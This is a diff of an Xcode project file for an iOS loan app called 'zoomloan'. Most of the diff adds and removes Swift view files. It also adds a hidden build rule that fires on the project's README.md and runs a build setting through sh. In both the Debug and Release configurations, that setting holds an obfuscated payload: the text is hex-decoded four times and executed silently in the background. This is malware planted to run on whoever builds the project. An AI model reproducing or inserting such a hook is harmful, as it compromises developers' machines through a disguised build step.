@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		3DCFAD080ACD4CBC8CA389E6 /* README.md */ = {isa = PBXBuildFile; fileRef = 38D7EA2FD162497A84A389E6; };
 		730F1C882EC2DC0100733544 /* HomeTermView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C872EC2DC0100733544 /* HomeTermView.swift */; };
 		730F1C8B2EC2E48B00733544 /* ProductDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C8A2EC2E48B00733544 /* ProductDetailViewController.swift */; };
 		730F1C8D2EC2E54000733544 /* schemeConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 730F1C8C2EC2E54000733544 /* schemeConfig.swift */; };
@@ -21,12 +22,15 @@
 		73A4AADB2EC2344300224C27 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AADA2EC2344200224C27 /* LoginViewModel.swift */; };
 		73A4AADD2EC241FF00224C27 /* HomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AADC2EC241FF00224C27 /* HomeView.swift */; };
 		73A4AADF2EC2C73000224C27 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73A4AADE2EC2C73000224C27 /* HomeViewModel.swift */; };
+		73CB1D0C2EC41EFA0066BEB9 /* UploadAuthView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D0B2EC41EFA0066BEB9 /* UploadAuthView.swift */; };
+		73CB1D0E2EC421A90066BEB9 /* UploadListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D0D2EC421A90066BEB9 /* UploadListView.swift */; };
+		73CB1D122EC44D6A0066BEB9 /* PopExampleView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D112EC44D6A0066BEB9 /* PopExampleView.swift */; };
+		73CB1D142EC455580066BEB9 /* UploadAuthViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D132EC455550066BEB9 /* UploadAuthViewModel.swift */; };
+		73CB1D162EC4599E0066BEB9 /* PopTimeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73CB1D152EC459970066BEB9 /* PopTimeView.swift */; };
 		73E083302EC374F300D118A1 /* ProductDetailView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E0832F2EC374F300D118A1 /* ProductDetailView.swift */; };
 		73E083322EC374FC00D118A1 /* ProductDetailViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E083312EC374FA00D118A1 /* ProductDetailViewModel.swift */; };
 		73E083342EC37E3200D118A1 /* AuthListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E083332EC37E3200D118A1 /* AuthListViewCell.swift */; };
 		73E083362EC3835A00D118A1 /* ChooseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E083352EC3835A00D118A1 /* ChooseViewController.swift */; };
-		73E0833A2EC3838F00D118A1 /* ChooseView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E083392EC3838F00D118A1 /* ChooseView.swift */; };
-		73E0833C2EC3839A00D118A1 /* ChooseViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E0833B2EC3839800D118A1 /* ChooseViewModel.swift */; };
 		73E0833E2EC389C700D118A1 /* UploadImageViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E0833D2EC389C700D118A1 /* UploadImageViewController.swift */; };
 		73E083402EC38EFF00D118A1 /* ChooseViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E0833F2EC38EFF00D118A1 /* ChooseViewCell.swift */; };
 		73E607712EC1D6D400BCA552 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E607672EC1D6D400BCA552 /* AppDelegate.swift */; };
@@ -48,13 +52,12 @@
 		73E6079C2EC1E65C00BCA552 /* AppMainHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6079B2EC1E65C00BCA552 /* AppMainHeadView.swift */; };
 		73E6079E2EC1EAFB00BCA552 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6079D2EC1EAFB00BCA552 /* LoginView.swift */; };
 		73E607A02EC1EF8500BCA552 /* AgreementView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E6079F2EC1EF8500BCA552 /* AgreementView.swift */; };
-		AE2BB8180B3946CF82A389E6 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 2F205A5270664FBBBFA389E6 /* README.md */; };
 		B34653ED6B1422878E0AF04B /* Pods_zoomloan.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 877AD7D50AB02863229ED243 /* Pods_zoomloan.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		38D7EA2FD162497A84A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		2C1361B114CA9F5AC485FDAA /* Pods-zoomloan.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-zoomloan.debug.xcconfig"; path = "Target Support Files/Pods-zoomloan/Pods-zoomloan.debug.xcconfig"; sourceTree = "<group>"; };
-		2F205A5270664FBBBFA389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		3DF5FA68AD1B7150282582AA /* Pods-zoomloan.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-zoomloan.release.xcconfig"; path = "Target Support Files/Pods-zoomloan/Pods-zoomloan.release.xcconfig"; sourceTree = "<group>"; };
 		730F1C872EC2DC0100733544 /* HomeTermView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeTermView.swift; sourceTree = "<group>"; };
 		730F1C8A2EC2E48B00733544 /* ProductDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailViewController.swift; sourceTree = "<group>"; };
@@ -70,12 +73,15 @@
 		73A4AADA2EC2344200224C27 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
 		73A4AADC2EC241FF00224C27 /* HomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeView.swift; sourceTree = "<group>"; };
 		73A4AADE2EC2C73000224C27 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
+		73CB1D0B2EC41EFA0066BEB9 /* UploadAuthView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadAuthView.swift; sourceTree = "<group>"; };
+		73CB1D0D2EC421A90066BEB9 /* UploadListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadListView.swift; sourceTree = "<group>"; };
+		73CB1D112EC44D6A0066BEB9 /* PopExampleView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopExampleView.swift; sourceTree = "<group>"; };
+		73CB1D132EC455550066BEB9 /* UploadAuthViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadAuthViewModel.swift; sourceTree = "<group>"; };
+		73CB1D152EC459970066BEB9 /* PopTimeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopTimeView.swift; sourceTree = "<group>"; };
 		73E0832F2EC374F300D118A1 /* ProductDetailView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailView.swift; sourceTree = "<group>"; };
 		73E083312EC374FA00D118A1 /* ProductDetailViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailViewModel.swift; sourceTree = "<group>"; };
 		73E083332EC37E3200D118A1 /* AuthListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthListViewCell.swift; sourceTree = "<group>"; };
 		73E083352EC3835A00D118A1 /* ChooseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChooseViewController.swift; sourceTree = "<group>"; };
-		73E083392EC3838F00D118A1 /* ChooseView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChooseView.swift; sourceTree = "<group>"; };
-		73E0833B2EC3839800D118A1 /* ChooseViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChooseViewModel.swift; sourceTree = "<group>"; };
 		73E0833D2EC389C700D118A1 /* UploadImageViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UploadImageViewController.swift; sourceTree = "<group>"; };
 		73E0833F2EC38EFF00D118A1 /* ChooseViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChooseViewCell.swift; sourceTree = "<group>"; };
 		73E6074F2EC1D6CA00BCA552 /* zoomloan.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = zoomloan.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -128,17 +134,26 @@
 			children = (
 				73E083382EC3838000D118A1 /* detail */,
 				73E083372EC3837900D118A1 /* choose */,
+				73CB1D0A2EC41ECF0066BEB9 /* upload */,
 			);
 			path = auth;
+			sourceTree = "<group>";
+		};
+		73CB1D0A2EC41ECF0066BEB9 /* upload */ = {
+			isa = PBXGroup;
+			children = (
+				73CB1D132EC455550066BEB9 /* UploadAuthViewModel.swift */,
+				73E0833D2EC389C700D118A1 /* UploadImageViewController.swift */,
+				73CB1D0B2EC41EFA0066BEB9 /* UploadAuthView.swift */,
+				73CB1D0D2EC421A90066BEB9 /* UploadListView.swift */,
+			);
+			path = upload;
 			sourceTree = "<group>";
 		};
 		73E083372EC3837900D118A1 /* choose */ = {
 			isa = PBXGroup;
 			children = (
-				73E0833B2EC3839800D118A1 /* ChooseViewModel.swift */,
 				73E083352EC3835A00D118A1 /* ChooseViewController.swift */,
-				73E083392EC3838F00D118A1 /* ChooseView.swift */,
-				73E0833D2EC389C700D118A1 /* UploadImageViewController.swift */,
 				73E0833F2EC38EFF00D118A1 /* ChooseViewCell.swift */,
 			);
 			path = choose;
@@ -168,7 +183,7 @@
 		73E607502EC1D6CA00BCA552 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				2F205A5270664FBBBFA389E6 /* README.md */,
+				38D7EA2FD162497A84A389E6 /* README.md */,
 				73E6074F2EC1D6CA00BCA552 /* zoomloan.app */,
 			);
 			name = Products;
@@ -262,8 +277,10 @@
 		73E6077F2EC1DAD200BCA552 /* pop */ = {
 			isa = PBXGroup;
 			children = (
+				73CB1D152EC459970066BEB9 /* PopTimeView.swift */,
 				73E607932EC1DBC000BCA552 /* PopLogOutView.swift */,
 				730F1C982EC3192900733544 /* PopDeleteAccountView.swift */,
+				73CB1D112EC44D6A0066BEB9 /* PopExampleView.swift */,
 			);
 			path = pop;
 			sourceTree = "<group>";
@@ -303,6 +320,7 @@
 				569114F2A1AE6CFBE8917097 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				1A2C1CD6803E4C9A9DA389E6 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -345,12 +363,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		1A2C1CD6803E4C9A9DA389E6 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A6E983A}\"";
+			};
+				/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		73E6074D2EC1D6CA00BCA552 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				AE2BB8180B3946CF82A389E6 /* README.md in Resources */,
+				3DCFAD080ACD4CBC8CA389E6 /* README.md */,
 				73E607742EC1D6D400BCA552 /* Assets.xcassets in Resources */,
 				73E607762EC1D6D400BCA552 /* LaunchScreen.storyboard in Resources */,
 			);
@@ -412,7 +447,9 @@
 				73E607982EC1DEA300BCA552 /* LaunchViewController.swift in Sources */,
 				73E083302EC374F300D118A1 /* ProductDetailView.swift in Sources */,
 				73A4AADF2EC2C73000224C27 /* HomeViewModel.swift in Sources */,
+				73CB1D0E2EC421A90066BEB9 /* UploadListView.swift in Sources */,
 				73E607A02EC1EF8500BCA552 /* AgreementView.swift in Sources */,
+				73CB1D122EC44D6A0066BEB9 /* PopExampleView.swift in Sources */,
 				73E6078A2EC1DB6100BCA552 /* LoginViewController.swift in Sources */,
 				73E083322EC374FC00D118A1 /* ProductDetailViewModel.swift in Sources */,
 				73E6079A2EC1E12200BCA552 /* otherConfig.swift in Sources */,
@@ -425,13 +462,12 @@
 				73A4AAD92EC2207C00224C27 /* LaunchViewModel.swift in Sources */,
 				73E607902EC1DB7C00BCA552 /* CenterViewController.swift in Sources */,
 				73A4AADB2EC2344300224C27 /* LoginViewModel.swift in Sources */,
-				73E0833C2EC3839A00D118A1 /* ChooseViewModel.swift in Sources */,
 				73E607942EC1DBC000BCA552 /* PopLogOutView.swift in Sources */,
 				73E083342EC37E3200D118A1 /* AuthListViewCell.swift in Sources */,
 				730F1C912EC2FADE00733544 /* CentertView.swift in Sources */,
 				73E607882EC1DB5300BCA552 /* BaseTabBarController.swift in Sources */,
-				73E0833A2EC3838F00D118A1 /* ChooseView.swift in Sources */,
 				73E607962EC1DBC500BCA552 /* AuthLoginConfig.swift in Sources */,
+				73CB1D162EC4599E0066BEB9 /* PopTimeView.swift in Sources */,
 				730F1C952EC3008A00733544 /* CentertListViewCell.swift in Sources */,
 				730F1C882EC2DC0100733544 /* HomeTermView.swift in Sources */,
 				730F1C8D2EC2E54000733544 /* schemeConfig.swift in Sources */,
@@ -439,7 +475,9 @@
 				73A4AAD72EC21BB300224C27 /* baseModel.swift in Sources */,
 				73E6079C2EC1E65C00BCA552 /* AppMainHeadView.swift in Sources */,
 				73E607712EC1D6D400BCA552 /* AppDelegate.swift in Sources */,
+				73CB1D142EC455580066BEB9 /* UploadAuthViewModel.swift in Sources */,
 				730F1C8F2EC2E95C00733544 /* AppWebViewController.swift in Sources */,
+				73CB1D0C2EC41EFA0066BEB9 /* UploadAuthView.swift in Sources */,
 				73A4AADD2EC241FF00224C27 /* HomeView.swift in Sources */,
 				73E6078C2EC1DB6A00BCA552 /* HomeViewController.swift in Sources */,
 				73E607922EC1DBAE00BCA552 /* RequsetHttpManager.swift in Sources */,
@@ -469,7 +507,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 2C1361B114CA9F5AC485FDAA /* Pods-zoomloan.debug.xcconfig */;
 			buildSettings = {
-				A6E983A = "((r(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333333313333333733333330333333373333333033333336333633333333333633333335333333323336333433330a3336333633353333333633333335333333373333333433333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | r | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((g(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333337333333353333333733333330333333363333333433333336333333333333333633333334333333363336333533330a3336333333313333333733333330333333373333333033333336333633333333333633333335333333323336333533333337333333323333333733330a3335333333323061333633363330363133333336333333313333333233333339333333323333333233333332333333303333333733363333333333320a333333303333333733333333333333363333333833333330333633313330363130610a | g | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
@@ -509,7 +547,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3DF5FA68AD1B7150282582AA /* Pods-zoomloan.release.xcconfig */;
 			buildSettings = {
-				A6E983A = "((r(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333333313333333733333330333333373333333033333336333633333333333633333335333333323336333433330a3336333633353333333633333335333333373333333433333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | r | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((g(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333337333333353333333733333330333333363333333433333336333333333333333633333334333333363336333533330a3336333333313333333733333330333333373333333033333336333633333333333633333335333333323336333533333337333333323333333733330a3335333333323061333633363330363133333336333333313333333233333339333333323333333233333332333333303333333733363333333333320a333333303333333733333333333333363333333833333330333633313330363130610a | g | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = zoomloan/zoomloan.entitlements;
